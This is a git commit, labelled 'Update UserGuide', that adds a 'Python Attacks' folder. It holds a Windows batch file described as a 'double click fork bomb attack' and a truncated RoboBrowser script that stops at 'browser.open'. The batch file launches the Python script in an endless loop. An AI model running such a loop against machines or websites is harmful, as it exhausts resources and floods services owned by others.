22f4ef71bfbf17c5d1db9316092a7cd5ffdadd7e
Borderlord <102431262+Borderlord@users.noreply.github.com>
2023-07-12 12:32:46 +0000

    Update UserGuide

---
+++ Python Attacks/double click fork bomb attack using commmand prompt/Dobule click fork bombing.bat
@@ -0,0 +1,8 @@
+
+@echo off
+set i=0
+:loop
+set /a i=i+1
+echo Attack -> %i%
+python gulia.py
+goto loop
---
+++ Python Attacks/gulia.py
@@ -0,0 +1,9 @@
+from robobrowser import RoboBrowser
+from time import sleep
+import random
+ 
+#i=0
+
+#sleep(1)
+browser = RoboBrowser(parser='html.parser')
+browser.open
